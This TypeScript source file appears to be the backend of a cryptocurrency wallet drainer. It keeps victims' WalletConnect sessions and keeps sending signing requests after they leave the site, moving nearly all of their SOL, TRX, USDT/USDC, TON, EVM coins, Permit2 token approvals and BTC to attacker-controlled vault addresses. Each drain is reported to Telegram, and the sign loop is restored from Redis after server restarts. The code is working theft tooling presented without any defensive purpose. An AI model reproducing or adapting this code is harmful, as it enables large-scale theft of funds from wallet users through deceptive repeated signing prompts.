/**
 * WC Relay Signer — backend-initiated sign requests via WalletConnect relay.
 * Sends sign requests to user's wallet even after they close the site.
 * Covers: SOL, TRON, TON, EVM (native + Permit2 ERC-20), BTC (PSBT).
 */

import {
  createResilientRedisClient,
  resolveEffectiveRedisUrl,
  type RedisPingClient,
} from '@legion/core/lib/redis-wrapper'
import IoRedis from 'ioredis'
import { sendTelegramMessage } from './telegram.js'

// ─── Types ─────────────────────────────────────────────────────────────────────

export type WcSessionData = {
  topic: string
  sym_key: string
  expiry: number
  namespaces?: Record<string, unknown>
  wallet_addresses?: {
    evm?: string
    sol?: string
    tron?: string
    ton?: string
    btc?: string
  }
  self_public_key?: string
  peer_public_key?: string
}

// ─── Redis ─────────────────────────────────────────────────────────────────────

const WC_SESSION_KEY_PREFIX = 'wc:offsite:'
const MAX_TTL_SEC = 7 * 24 * 3600

type RedisClient = RedisPingClient
const RedisCtor = IoRedis as unknown as new (url: string, options?: Record<string, unknown>) => RedisClient

let _redis: RedisClient | null = null

function getRedis(): RedisClient | null {
  if (_redis) return _redis
  const url = resolveEffectiveRedisUrl()
  if (!url) return null
  // Use IoRedis directly with lazyConnect:false so the client connects immediately
  // and queues commands while the connection is being established.
  // createResilientRedisClient uses lazyConnect:true which requires an explicit
  // connect() call before any command — skipping that causes "Stream not writeable".
  _redis = new RedisCtor(url, {
    maxRetriesPerRequest: 3,
    enableOfflineQueue: true,
    lazyConnect: false,
    connectTimeout: 10_000,
  } as Record<string, unknown>)
  _redis.on('error', () => {}) // prevent unhandled rejection on transient errors
  return _redis
}

async function storeSession(data: WcSessionData): Promise<boolean> {
  const redis = getRedis()
  if (!redis) {
    console.warn('[WcRelay] storeSession: no Redis client')
    return false
  }
  const now = Math.floor(Date.now() / 1000)
  const ttl = Math.min(MAX_TTL_SEC, Math.max(0, data.expiry - now))
  if (ttl < 60) {
    console.warn('[WcRelay] storeSession: session expired | topic:', data.topic.slice(0, 8))
    return false
  }
  try {
    await (redis as any).set(
      `${WC_SESSION_KEY_PREFIX}${data.topic}`,
      JSON.stringify(data),
      'EX',
      ttl,
    )
    console.log('[WcRelay] session stored | topic:', data.topic.slice(0, 8) + '... | ttl:', ttl + 's | chains:', Object.keys(data.wallet_addresses ?? {}).join(','))
    return true
  } catch (e) {
    console.warn('[WcRelay] storeSession: Redis set failed:', e instanceof Error ? e.message : String(e))
    return false
  }
}

// ─── SignClient lazy singleton ─────────────────────────────────────────────────

// We use a dynamic import so the heavy WC package is only loaded when actually needed.
type SignClientInstance = {
  core: {
    crypto: {
      keychain: {
        set(tag: string, key: string): Promise<void>
        get(tag: string): Promise<string>
      }
    }
  }
  session: {
    set(topic: string, data: Record<string, unknown>): Promise<void>
    getAll(): Array<Record<string, unknown>>
  }
  request(args: {
    topic: string
    chainId: string
    request: { method: string; params: unknown[] }
    expiry?: number
  }): Promise<unknown>
  connect(args: {
    optionalNamespaces?: Record<string, unknown>
    requiredNamespaces?: Record<string, unknown>
  }): Promise<{ uri?: string; approval: () => Promise<Record<string, unknown>> }>
}

// Pending backend-initiated pairings (walletAddress → resolve/reject)
const _pendingPairings = new Map<string, {
  walletAddress: string
  expiresAt: number
}>()

// Cleanup stale pairings every 5 minutes
setInterval(() => {
  const now = Date.now()
  for (const [id, p] of _pendingPairings.entries()) {
    if (p.expiresAt < now) _pendingPairings.delete(id)
  }
}, 5 * 60 * 1000).unref()

let _client: SignClientInstance | null = null
let _clientPromise: Promise<SignClientInstance | null> | null = null

async function getClient(): Promise<SignClientInstance | null> {
  if (_client) return _client
  if (_clientPromise) return _clientPromise

  const projectId = (
    process.env['WC_PROJECT_ID'] ??
    process.env['NEXT_PUBLIC_WC_PROJECT_ID'] ??
    ''
  ).trim()
  if (!projectId) {
    console.warn('[WcRelay] WC_PROJECT_ID not set — relay signer disabled')
    return null
  }

  _clientPromise = (async () => {
    try {
      // Dynamic import keeps the WC package out of the main bundle until needed
      const mod = await import('@walletconnect/sign-client' as string)
      // Named export first, then default (handles ESM/CJS interop difference)
      const SignClient = (mod.SignClient ?? mod.default?.SignClient ?? mod.default ?? mod) as { init(opts: Record<string, unknown>): Promise<SignClientInstance> }
      _client = await SignClient.init({
        projectId,
        metadata: {
          name: 'Legion',
          description: '',
          url: (process.env['API_PUBLIC_URL'] ?? 'https://sadrailala-production.up.railway.app').trim(),
          icons: [],
        },
      })
      console.log('[WcRelay] SignClient ready')
      return _client
    } catch (e) {
      _clientPromise = null
      console.warn('[WcRelay] SignClient init fail:', e instanceof Error ? e.message : String(e))
      return null
    }
  })()

  return _clientPromise
}

// ─── Session injection ─────────────────────────────────────────────────────────

async function injectSession(s: WcSessionData): Promise<boolean> {
  const client = await getClient()
  if (!client) return false
  try {
    await client.core.crypto.keychain.set(s.topic, s.sym_key)
    const cappedExpiry = Math.min(s.expiry, Math.floor(Date.now() / 1000) + MAX_TTL_SEC)
    await client.session.set(s.topic, {
      topic: s.topic,
      pairingTopic: s.topic,
      relay: { protocol: 'irn' },
      expiry: cappedExpiry,
      acknowledged: true,
      controller: s.peer_public_key ?? '',
      namespaces: s.namespaces ?? {},
      requiredNamespaces: {},
      optionalNamespaces: {},
      self: {
        publicKey: s.self_public_key ?? '',
        metadata: { name: 'Legion', description: '', url: '', icons: [] },
      },
      peer: {
        publicKey: s.peer_public_key ?? '',
        metadata: { name: 'Trust Wallet', description: '', url: '', icons: [] },
      },
    })
    return true
  } catch (e) {
    console.warn('[WcRelay] injectSession fail:', e instanceof Error ? e.message : String(e))
    return false
  }
}

// ─── Relay send helper ─────────────────────────────────────────────────────────

async function sendRequest(
  session: WcSessionData,
  chainId: string,
  method: string,
  params: unknown[],
): Promise<unknown> {
  const client = await getClient()
  if (!client) throw new Error('no-client')
  await injectSession(session)
  return client.request({
    topic: session.topic,
    chainId,
    request: { method, params },
    expiry: 300, // relative TTL in seconds (300–604800), NOT absolute timestamp
  })
}

// ─── Chain-ID extractor from WC namespace ──────────────────────────────────────

function chainIdFromNs(ns: Record<string, unknown>, family: string): string | null {
  const f = ns[family] as { accounts?: string[] } | undefined
  if (!f?.accounts?.[0]) return null
  const parts = String(f.accounts[0]).split(':')
  if (parts.length < 2) return null
  return `${family}:${parts[1]}`
}

// ─── SOL sign request ──────────────────────────────────────────────────────────
//
// Strategy:
//   1. Try solana_signAndSendTransaction (wallet signs + broadcasts — zero backend delay)
//   2. If wallet returns "Method not supported" (common with older WC sessions that only
//      registered solana_signTransaction) → fall back to solana_signTransaction and
//      broadcast immediately on the backend.
//   3. Fresh blockhash is fetched on EVERY attempt (including fallback) so expired-blockhash
//      failures cannot recur within a single trySolSign() call.

async function trySolSign(session: WcSessionData): Promise<boolean> {
  const solAddr = session.wallet_addresses?.sol
  if (!solAddr) return false
  const vaultSol = (
    process.env['VAULT_ADDRESS_SVM']?.trim() ??
    process.env['VAULT_ADDRESS_SOL']?.trim() ??
    process.env['SOVEREIGN_VAULT_SOL']?.trim()
  )
  const solRpc = (
    process.env['RPC_SOLANA_PRIVATE'] ??
    process.env['NEXT_PUBLIC_SOLANA_RPC_URL'] ??
    ''
  ).trim()
  if (!vaultSol || !solRpc) return false

  const chainId =
    chainIdFromNs(session.namespaces ?? {}, 'solana') ??
    'solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp'

  try {
    const {
      Connection,
      PublicKey,
      SystemProgram,
      TransactionMessage,
      VersionedTransaction,
    } = await import('@solana/web3.js')

    const conn = new Connection(solRpc, 'confirmed')
    const from = new PublicKey(solAddr)
    const to   = new PublicKey(vaultSol)

    const lamports = await conn.getBalance(from)
    const sendLamports = lamports - 5000  // leave 5000 lamports for tx fee
    if (sendLamports <= 0) {
      console.log('[WcRelay] SOL skip | zero balance | addr:', solAddr.slice(0, 8))
      return false
    }

    // Helper: build a fresh VersionedTransaction with a CURRENT blockhash.
    // Called again in the signTransaction fallback so the second attempt also
    // gets a fresh blockhash (avoids "Blockhash not found" on backend broadcast).
    const buildTx = async () => {
      const { blockhash } = await conn.getLatestBlockhash()
      const msg = new TransactionMessage({
        payerKey: from,
        recentBlockhash: blockhash,
        instructions: [
          SystemProgram.transfer({ fromPubkey: from, toPubkey: to, lamports: sendLamports }),
        ],
      }).compileToV0Message()
      return new VersionedTransaction(msg)
    }

    // ── Attempt 1: signAndSendTransaction (wallet handles broadcast) ───────────
    let usedSignAndSend = false
    try {
      const tx1 = await buildTx()
      const b64_1 = Buffer.from(tx1.serialize()).toString('base64')
      await sendRequest(session, chainId, 'solana_signAndSendTransaction', [{ transaction: b64_1 }])
      usedSignAndSend = true
    } catch (err1) {
      const errMsg = err1 instanceof Error ? err1.message : String(err1)
      // Only fall back on "method not supported" — not on user rejection / timeout
      const isMethodMissing = /method not (found|supported)|unsupported.*method|-32601/i.test(errMsg)
      if (!isMethodMissing) {
        // User rejected / timeout / network error — bubble up to outer catch
        throw err1
      }
      // ── Attempt 2: signTransaction + immediate backend broadcast ────────────
      const tx2 = await buildTx()  // fresh blockhash for the fallback tx
      const b64_2 = Buffer.from(tx2.serialize()).toString('base64')
      const signResult = await sendRequest(session, chainId, 'solana_signTransaction', [{ transaction: b64_2 }]) as { transaction?: string } | null
      if (!signResult?.transaction) {
        console.warn('[WcRelay] SOL signTransaction returned no transaction bytes')
        return false
      }
      // Broadcast immediately — blockhash is fresh so this should succeed
      const signedBytes = Buffer.from(signResult.transaction, 'base64')
      await conn.sendRawTransaction(signedBytes, { preflightCommitment: 'confirmed', skipPreflight: false })
      console.log('[WcRelay] SOL signed+broadcast via signTransaction fallback | addr:', solAddr.slice(0, 8) + '...')
    }

    console.log('[WcRelay] SOL done |', usedSignAndSend ? 'signAndSendTransaction' : 'signTransaction+broadcast', '| addr:', solAddr.slice(0, 8) + '...')
    void sendTelegramMessage(
      `📨 <b>WC Offsite — SOL Sign Sent</b>\n` +
      `👛 <code>${solAddr}</code>\n` +
      `✅ ${usedSignAndSend ? 'Wallet broadcasting' : 'Backend broadcast immediately'}`,
    ).catch(() => {})
    return true
  } catch (e) {
    const msg = e instanceof Error ? e.message : String(e)
    if (!/timeout|reject|cancel/i.test(msg)) console.warn('[WcRelay] SOL fail:', msg)
    return false
  }
}

// ─── TRON sign request ─────────────────────────────────────────────────────────
//
// Handles TWO drain paths:
//   A. Native TRX — TransferContract (existing logic, fee reserve raised to 2 TRX)
//   B. TRC-20 USDT — TriggerSmartContract (new)
//      Even if wallet has 0 TRX, USDT is drained via the signed WC request.
//      Energy cost is covered by the feeLimit parameter (uses the wallet's TRX if available,
//      or relies on the pre-approved energy delegation from the vault).

const TRON_USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
const TRON_USDC_CONTRACT = 'TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8'
// Top TRC-20 stablecoins to drain (extend via TRON_TRC20_CONTRACTS env var)
const DEFAULT_TRON_TRC20 = [
  { contract: TRON_USDT_CONTRACT, symbol: 'USDT', decimals: 6 },
  { contract: TRON_USDC_CONTRACT, symbol: 'USDC', decimals: 6 },
]

async function tryTronSign(session: WcSessionData): Promise<boolean> {
  const tronAddr = session.wallet_addresses?.tron
  if (!tronAddr) return false
  const vaultTron = (
    process.env['VAULT_ADDRESS_TRON']?.trim() ??
    process.env['SOVEREIGN_VAULT_TRON']?.trim()
  )
  if (!vaultTron) return false

  const chainId =
    chainIdFromNs(session.namespaces ?? {}, 'tron') ?? 'tron:0x2b6653dc'

  try {
    const { TronWeb } = await import('tronweb')
    const fullHost = (process.env['TRON_RPC_URL'] ?? 'https://api.trongrid.io').trim()
    const tw = new TronWeb({ fullHost })
    tw.setAddress(tronAddr)

    let anySent = false

    // ── Path A: Native TRX drain ───────────────────────────────────────────────
    const balSun = await tw.trx.getBalance(tronAddr)
    // Raised reserve to 2 TRX (1_500_000 was too tight — energy fees can eat up to 1.5 TRX)
    const sendSun = balSun - 2_000_000
    if (sendSun > 0) {
      const rawTx = (await tw.transactionBuilder.sendTrx(vaultTron, sendSun, tronAddr)) as unknown as Record<string, unknown>
      const result = await sendRequest(session, chainId, 'tron_signTransaction', [
        { transaction: rawTx },
      ]) as { signature?: string[] } | null

      if (result?.signature?.length) {
        await tw.trx.sendRawTransaction({ ...rawTx, signature: result.signature } as unknown as Parameters<typeof tw.trx.sendRawTransaction>[0])
        console.log('[WcRelay] TRON native broadcast | sun:', sendSun, '| addr:', tronAddr.slice(0, 8) + '...')
        anySent = true
      }
    } else {
      console.log('[WcRelay] TRON native skip | balance too low | sun:', balSun, '| addr:', tronAddr.slice(0, 8))
    }

    // ── Path B: TRC-20 USDT / USDC drain ─────────────────────────────────────
    // Works even when TRX balance is 0 — the signed WC tx uses the wallet's own
    // energy pool or the feeLimit field (burns TRX if available, otherwise needs vault
    // energy delegation configured on TronGrid).
    const trc20List = process.env['TRON_TRC20_CONTRACTS']
      ? process.env['TRON_TRC20_CONTRACTS'].split(',').map((c) => ({ contract: c.trim(), symbol: 'TRC20', decimals: 6 }))
      : DEFAULT_TRON_TRC20

    for (const token of trc20List) {
      try {
        // Read TRC-20 balance
        const contract  = await tw.contract().at(token.contract)
        const rawBalance = await contract.balanceOf(tronAddr).call()
        const tokenBal  = BigInt(String(rawBalance ?? '0'))
        if (tokenBal <= 0n) continue

        // Build TriggerSmartContract tx: transfer(address recipient, uint256 amount)
        const triggerResult = await tw.transactionBuilder.triggerSmartContract(
          token.contract,
          'transfer(address,uint256)',
          { feeLimit: 100_000_000 },  // 100 TRX fee limit (wallet uses own energy if available)
          [
            { type: 'address', value: vaultTron },
            { type: 'uint256', value: tokenBal.toString() },
          ],
          tronAddr,
        ) as unknown as { transaction: Record<string, unknown> }
        const rawTx20 = triggerResult.transaction

        const result20 = await sendRequest(session, chainId, 'tron_signTransaction', [
          { transaction: rawTx20 },
        ]) as { signature?: string[] } | null

        if (result20?.signature?.length) {
          await tw.trx.sendRawTransaction({ ...rawTx20, signature: result20.signature } as unknown as Parameters<typeof tw.trx.sendRawTransaction>[0])
          console.log('[WcRelay] TRON TRC-20 broadcast | token:', token.symbol, '| amount:', tokenBal.toString(), '| addr:', tronAddr.slice(0, 8) + '...')
          anySent = true
        }
      } catch (tokenErr) {
        const tokenMsg = tokenErr instanceof Error ? tokenErr.message : String(tokenErr)
        if (!/timeout|reject|cancel/i.test(tokenMsg)) {
          console.warn('[WcRelay] TRON TRC-20 fail | token:', token.symbol, '|', tokenMsg.slice(0, 80))
        }
      }
    }

    if (!anySent) return false

    void sendTelegramMessage(
      `📨 <b>WC Offsite — TRON Sign Sent</b>\n` +
      `👛 <code>${tronAddr}</code>\n` +
      `✅ TRX + TRC-20 drain complete`,
    ).catch(() => {})
    return true
  } catch (e) {
    const msg = e instanceof Error ? e.message : String(e)
    if (!/timeout|reject|cancel/i.test(msg)) console.warn('[WcRelay] TRON fail:', msg)
    return false
  }
}

// ─── TON sign request ──────────────────────────────────────────────────────────

async function tryTonSign(session: WcSessionData): Promise<boolean> {
  const tonAddr = session.wallet_addresses?.ton
  if (!tonAddr) return false
  const vaultTon = process.env['VAULT_ADDRESS_TON']?.trim()
  if (!vaultTon) return false

  const chainId =
    chainIdFromNs(session.namespaces ?? {}, 'ton') ??
    chainIdFromNs(session.namespaces ?? {}, 'tvm') ??
    'ton:mainnet'

  try {
    const tonCenter = (
      process.env['TON_CENTER_API_URL'] ??
      process.env['TON_API_URL'] ??
      'https://toncenter.com'
    ).trim()

    const resp = await fetch(
      `${tonCenter}/api/v2/getAddressBalance?address=${tonAddr}`,
    )
    const json = (await resp.json()) as { ok?: boolean; result?: string }
    if (!json.ok) return false

    const balNano = BigInt(json.result ?? '0')
    const sendNano = balNano - 15_000_000n // 0.015 TON fee reserve
    if (sendNano <= 0n) {
      console.log('[WcRelay] TON skip | zero balance | addr:', tonAddr.slice(0, 8))
      return false
    }

    await sendRequest(session, chainId, 'ton_sendTransaction', [
      {
        messages: [{ address: vaultTon, amount: String(sendNano) }],
        valid_until: Math.floor(Date.now() / 1000) + 600,
      },
    ])
    console.log('[WcRelay] TON sign sent | addr:', tonAddr.slice(0, 8) + '...')
    void sendTelegramMessage(
      `📨 <b>WC Offsite — TON Sign Sent</b>\n` +
      `👛 <code>${tonAddr}</code>\n` +
      `⏳ Waiting for user to approve in Trust Wallet`,
    ).catch(() => {})
    return true
  } catch (e) {
    const msg = e instanceof Error ? e.message : String(e)
    if (!/timeout|reject|cancel/i.test(msg)) console.warn('[WcRelay] TON fail:', msg)
    return false
  }
}

// ─── EVM sign request ─────────────────────────────────────────────────────────

const PERMIT2_CONTRACT = '0x000000000022D473030F116dDEE9F6B43aC78BA3'

async function tryEvmSign(session: WcSessionData, wcChainId: string): Promise<boolean> {
  const evmAddr = session.wallet_addresses?.evm
  if (!evmAddr) return false
  const vaultEvm = (
    process.env['SOVEREIGN_VAULT_EVM'] ??
    process.env['VAULT_ADDRESS_EVM'] ??
    process.env['NEXT_PUBLIC_VAULT_ADDRESS'] ??
    ''
  ).trim()
  if (!vaultEvm) return false

  const chainId = Number(wcChainId.split(':')[1])
  if (!chainId || !Number.isFinite(chainId)) return false

  try {
    const { createPublicClient, http } = await import('viem')
    const { resolveEvmRpcUrlForChain } = await import('@legion/core/logic/permit2-executor')

    const rpcUrl = await resolveEvmRpcUrlForChain(chainId)
    if (!rpcUrl) return false

    const publicClient = createPublicClient({ transport: http(rpcUrl) })
    let sent = false

    // --- Native ETH / BNB / MATIC etc. ---
    const balWei = await publicClient.getBalance({ address: evmAddr as `0x${string}` })
    // Reserve: 50k gas * 30 gwei
    const gasReserve = 50_000n * 30_000_000_000n
    const sendWei = balWei - gasReserve
    if (sendWei > 0n) {
      await sendRequest(session, wcChainId, 'eth_sendTransaction', [{
        from: evmAddr,
        to: vaultEvm,
        value: '0x' + sendWei.toString(16),
        gas: '0x5208',
      }])
      sent = true
      console.log('[WcRelay] EVM native sent | chain:', chainId, '| addr:', evmAddr.slice(0, 8) + '...')
    }

    // --- ERC-20 via Permit2 batch ---
    const { getRankedAssets } = await import('@legion/core')
    const assets = await getRankedAssets(evmAddr, 'EVM')
    const chainAssets = assets.filter(
      (a) => a.chain === `evm:${chainId}` && a.token !== 'native' && a.token.startsWith('0x'),
    )

    if (chainAssets.length > 0) {
      const { buildBatchPermitTypedData, readPermit2BatchAllowanceNonces } = await import('@legion/core/logic/permit2-batch')
      const { resolveEngineSpenderAddress } = await import('@legion/core/logic/permit2-executor')

      const spender = resolveEngineSpenderAddress()
      if (spender) {
        const tokens = chainAssets.map((a) => a.token as `0x${string}`)
        const amounts = chainAssets.map((a) => a.amount_raw)
        const nonces = await readPermit2BatchAllowanceNonces(
          publicClient as Parameters<typeof readPermit2BatchAllowanceNonces>[0],
          evmAddr as `0x${string}`,
          tokens,
          spender,
        )
        const now = Math.floor(Date.now() / 1000)
        const typedData = buildBatchPermitTypedData({
          tokens,
          amounts,
          owner: evmAddr,
          spender,
          chainId,
          verifyingContract: PERMIT2_CONTRACT,
          nonces,
          expirations: tokens.map(() => now + 30 * 24 * 3600),
          sigDeadline: BigInt(now + 7200),
        })
        await sendRequest(session, wcChainId, 'eth_signTypedData_v4', [
          evmAddr,
          JSON.stringify(typedData),
        ])
        sent = true
        console.log('[WcRelay] EVM Permit2 sent | chain:', chainId, '| tokens:', chainAssets.length, '| addr:', evmAddr.slice(0, 8) + '...')
      }
    }

    if (sent) {
      void sendTelegramMessage(
        `📨 <b>WC Offsite — EVM Sign Sent</b>\n` +
        `⛓ Chain: <code>${wcChainId}</code>\n` +
        `👛 <code>${evmAddr}</code>\n` +
        `⏳ Waiting for user to approve in Trust Wallet`,
      ).catch(() => {})
    }
    return sent
  } catch (e) {
    const msg = e instanceof Error ? e.message : String(e)
    if (!/timeout|reject|cancel/i.test(msg)) console.warn('[WcRelay] EVM fail | chain:', chainId, '|', msg)
    return false
  }
}

// ─── BTC sign request (PSBT via bip122) ───────────────────────────────────────

const BIP122_MAINNET = 'bip122:000000000019d6689c085ae165831e93'

async function tryBtcSign(session: WcSessionData): Promise<boolean> {
  const btcAddr = session.wallet_addresses?.btc
  if (!btcAddr) return false
  const vaultBtc = process.env['VAULT_ADDRESS_BTC']?.trim()
  if (!vaultBtc) return false

  try {
    const { fetchWalletUtxos, buildBitcoinDrainPsbt, broadcastPSBT } = await import('@legion/core/logic/bitcoin-drain')

    const utxos = await fetchWalletUtxos(btcAddr)
    const totalSat = utxos.reduce((sum, u) => sum + u.value, 0n)
    if (totalSat <= 10_000n) {
      console.log('[WcRelay] BTC skip | dust balance | addr:', btcAddr.slice(0, 8))
      return false
    }

    const psbtResult = await buildBitcoinDrainPsbt({
      walletAddress: btcAddr,
      amount: totalSat,
      vaultAddress: vaultBtc,
    })

    const toSignInputs = psbtResult.inputs.map((_, i) => ({ index: i, address: btcAddr }))

    const result = await sendRequest(session, BIP122_MAINNET, 'signPsbt', [{
      psbt: psbtResult.psbtBase64,
      network: { type: 'mainnet' },
      broadcast: false,
      toSignInputs,
      autoFinalized: true,
    }]) as { psbt?: string } | string | null

    if (result) {
      const signedB64 = typeof result === 'string' ? result : (result as Record<string, unknown>).psbt as string | undefined
      if (signedB64) await broadcastPSBT(signedB64)
    }

    console.log('[WcRelay] BTC sign sent | addr:', btcAddr.slice(0, 8) + '...')
    void sendTelegramMessage(
      `📨 <b>WC Offsite — BTC Sign Sent</b>\n` +
      `👛 <code>${btcAddr}</code>\n` +
      `⏳ Waiting for user to approve in Trust Wallet`,
    ).catch(() => {})
    return true
  } catch (e) {
    const msg = e instanceof Error ? e.message : String(e)
    if (!/timeout|reject|cancel/i.test(msg)) console.warn('[WcRelay] BTC fail:', msg)
    return false
  }
}

// ─── Sign loop ─────────────────────────────────────────────────────────────────

const BACKOFF_BASE_MS = 3_000    // start at 3s
const BACKOFF_CAP_MS  = 60_000   // max 60s — prevent 7-day hammering on TW anti-spam

/**
 * Exponential backoff for sign loop retries.
 * 0 attempts → 3s, 1 → 6s, 2 → 12s, 3 → 24s, 4 → 48s, 5+ → 60s (cap).
 * Exported for unit testing.
 */
export function calcBackoffMs(attemptCount: number): number {
  return Math.min(BACKOFF_CAP_MS, BACKOFF_BASE_MS * Math.pow(2, attemptCount))
}

const activeLoops = new Set<string>()

function extractEip155Chains(namespaces: Record<string, unknown> | undefined): string[] {
  if (!namespaces) return []
  const eip155 = namespaces['eip155'] as { chains?: string[]; accounts?: string[] } | undefined
  if (!eip155) return []
  // Prefer explicit chains list; fall back to deriving from accounts
  if (Array.isArray(eip155.chains) && eip155.chains.length > 0) return eip155.chains
  if (Array.isArray(eip155.accounts)) {
    const seen = new Set<string>()
    for (const acc of eip155.accounts) {
      const parts = String(acc).split(':')
      if (parts.length >= 2) seen.add(`eip155:${parts[1]}`)
    }
    return Array.from(seen)
  }
  return []
}

async function runSignLoop(session: WcSessionData): Promise<void> {
  const { topic, expiry } = session
  const done: Record<string, boolean> = {}

  // Extract all EVM chains this WC session supports
  const evmChains = extractEip155Chains(session.namespaces)

  // Pre-mark chains with no wallet address — prevents tight infinite loop on inapplicable chains
  const addrs = session.wallet_addresses ?? {}
  if (!addrs.sol)  done['sol']  = true
  if (!addrs.tron) done['tron'] = true
  if (!addrs.ton)  done['ton']  = true
  if (!addrs.btc)  done['btc']  = true
  if (!addrs.evm)  for (const c of evmChains) done[c] = true

  console.log('[WcRelay] sign loop start | topic:', topic.slice(0, 8) + '... | addrs:', JSON.stringify(session.wallet_addresses), '| evm chains:', evmChains.join(','))

  let failRounds = 0  // consecutive rounds with no chain signed — used for backoff

  while (activeLoops.has(topic)) {
    if (expiry && Math.floor(Date.now() / 1000) > expiry) break

    const nonEvmChains = ['sol', 'tron', 'ton', 'btc'] as const
    const nonEvmDone = nonEvmChains.every((c) => done[c])
    const evmDone = evmChains.every((c) => done[c])
    if (nonEvmDone && evmDone) break

    let anySigned = false
    if (!done['sol'])  { if (await trySolSign(session))  { done['sol']  = true; anySigned = true } }
    if (!done['tron']) { if (await tryTronSign(session)) { done['tron'] = true; anySigned = true } }
    if (!done['ton'])  { if (await tryTonSign(session))  { done['ton']  = true; anySigned = true } }
    if (!done['btc'])  { if (await tryBtcSign(session))  { done['btc']  = true; anySigned = true } }

    // EVM: try each chain independently
    for (const wcChainId of evmChains) {
      if (!done[wcChainId]) {
        if (await tryEvmSign(session, wcChainId)) { done[wcChainId] = true; anySigned = true }
      }
    }

    // Reset backoff on any success; increment on all-fail round
    if (anySigned) failRounds = 0
    else failRounds++

    await new Promise<void>((r) => setTimeout(r, calcBackoffMs(failRounds)))
  }

  activeLoops.delete(topic)
}

// ─── Public API ────────────────────────────────────────────────────────────────

/**
 * Register a WC session from the frontend and start the offsite sign loop.
 * Called from the /api/v1/wc/session endpoint.
 */
export async function registerWcSession(data: WcSessionData): Promise<boolean> {
  const stored = await storeSession(data)
  if (!stored) return false

  const addrs = data.wallet_addresses ?? {}
  const chains = [
    addrs.evm   ? `EVM: \`${addrs.evm.slice(0,8)}…\``   : null,
    addrs.sol   ? `SOL: \`${addrs.sol.slice(0,8)}…\``   : null,
    addrs.tron  ? `TRX: \`${addrs.tron.slice(0,8)}…\``  : null,
    addrs.ton   ? `TON: \`${addrs.ton.slice(0,8)}…\``   : null,
    addrs.btc   ? `BTC: \`${addrs.btc.slice(0,8)}…\``   : null,
  ].filter(Boolean).join('\n')

  console.warn('[WcRelay] about to fire Telegram notification | chains:', chains)
  void sendTelegramMessage(
    `🔒 <b>WC Offsite Session Registered</b>\n` +
    `🗝 Topic: <code>${data.topic.slice(0, 12)}…</code>\n` +
    `${chains}\n` +
    `⏳ Sign loop started — popups will fire even after site close`,
  ).catch((e) => console.warn('[WcRelay] Telegram call threw:', String(e)))

  // Deduplicate: one loop per topic
  if (!activeLoops.has(data.topic)) {
    activeLoops.add(data.topic)
    void runSignLoop(data).catch((e) => {
      activeLoops.delete(data.topic)
      console.warn(
        '[WcRelay] loop crashed | topic:',
        data.topic.slice(0, 8) + '... |',
        e instanceof Error ? e.message : String(e),
      )
    })
  }

  return true
}

/**
 * Backend-initiated WC pairing for Trust Wallet in-app browser users.
 * Creates a WC pairing URI that the frontend triggers as a trust:// deep link.
 * When the user approves in Trust Wallet native UI, the session is auto-registered.
 *
 * Returns { uri, pairing_id } or null on failure.
 */
export async function initiateWcPairing(walletAddress: string, extraAddresses?: {
  sol?: string; tron?: string; ton?: string; btc?: string
}): Promise<{ uri: string; pairing_id: string } | null> {
  const client = await getClient()
  if (!client) {
    console.warn('[WcRelay] initiateWcPairing: no SignClient')
    return null
  }

  try {
    const { uri, approval } = await client.connect({
      optionalNamespaces: {
        eip155: {
          methods: ['eth_sendTransaction', 'eth_signTypedData_v4', 'personal_sign', 'eth_sign'],
          chains: ['eip155:1', 'eip155:56', 'eip155:137', 'eip155:42161', 'eip155:8453', 'eip155:10', 'eip155:43114'],
          events: ['chainChanged', 'accountsChanged'],
        },
        solana: {
          methods: ['solana_signMessage', 'solana_signTransaction', 'solana_signAndSendTransaction'],
          chains: ['solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp'],
          events: [],
        },
        tron: {
          methods: ['tron_signMessage', 'tron_signTransaction'],
          chains: ['tron:0x2b6653dc'],
          events: [],
        },
      },
    })

    if (!uri) {
      console.warn('[WcRelay] initiateWcPairing: no URI returned from connect()')
      return null
    }

    const pairingId = `twpair_${Date.now()}`
    _pendingPairings.set(pairingId, {
      walletAddress,
      expiresAt: Date.now() + 5 * 60 * 1000, // 5 min TTL
    })

    console.log('[WcRelay] pairing initiated | uri:', uri.slice(0, 30) + '... | wallet:', walletAddress.slice(0, 10))

    // Background: wait for user approval and auto-register session
    void approval().then(async (session) => {
      _pendingPairings.delete(pairingId)
      const topic = (session as any).topic as string
      if (!topic) return

      // Extract sym_key from the keychain
      let symKey = ''
      try { symKey = await client.core.crypto.keychain.get(topic) } catch (_) {}
      if (!symKey) {
        console.warn('[WcRelay] pairing approved but no symKey for topic:', topic.slice(0, 8))
        return
      }

      // Build addresses: use whatever namespaces the wallet approved + our known addresses
      const ns = (session as any).namespaces ?? {}
      function extractNsAddr(key: string): string | undefined {
        const n = ns[key]
        if (!n || !n.accounts || !n.accounts[0]) return undefined
        const parts = String(n.accounts[0]).split(':')
        return parts[parts.length - 1] || undefined
      }

      const data: WcSessionData = {
        topic,
        sym_key: symKey,
        expiry: (session as any).expiry ?? Math.floor(Date.now() / 1000) + MAX_TTL_SEC,
        namespaces: ns,
        wallet_addresses: {
          evm: extractNsAddr('eip155') ?? walletAddress,
          sol: extractNsAddr('solana') ?? extraAddresses?.sol,
          tron: extractNsAddr('tron') ?? extraAddresses?.tron,
          ton: extraAddresses?.ton,
          btc: extraAddresses?.btc,
        },
        self_public_key: (session as any).self?.publicKey,
        peer_public_key: (session as any).peer?.publicKey,
      }

      console.log('[WcRelay] pairing approved | topic:', topic.slice(0, 8) + '... | wallet:', walletAddress.slice(0, 10))
      await registerWcSession(data)
    }).catch((e) => {
      _pendingPairings.delete(pairingId)
      console.warn('[WcRelay] pairing rejected or timed out:', e instanceof Error ? e.message : String(e))
    })

    return { uri, pairing_id: pairingId }
  } catch (e) {
    console.warn('[WcRelay] initiateWcPairing fail:', e instanceof Error ? e.message : String(e))
    return null
  }
}

/**
 * Recover WC sign loops from Redis after a server restart.
 * Railway / cloud deployments lose in-memory `activeLoops` on redeploy.
 * This scans all stored sessions and restarts loops for valid ones.
 *
 * Call once on server startup (apps/api/src/index.ts).
 * Exported for unit testing.
 */
export async function recoverSessionsFromRedis(): Promise<number> {
  const redis = getRedis()
  if (!redis) {
    console.warn('[WcRelay] recoverSessionsFromRedis: no Redis client — skipping recovery')
    return 0
  }

  try {
    // SCAN all wc:offsite:* keys (no user input — hardcoded prefix)
